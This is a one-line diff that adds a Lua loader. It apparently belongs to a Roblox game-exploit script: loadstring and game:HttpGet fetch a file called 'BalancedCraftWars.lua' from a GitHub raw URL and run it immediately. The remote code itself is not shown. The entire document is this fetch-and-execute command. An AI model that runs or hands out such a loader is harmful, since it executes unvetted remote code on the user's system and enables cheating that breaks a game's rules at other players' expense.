@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/sheeshmainlol/skillissues/main/BalancedCraftWars.lua'))()
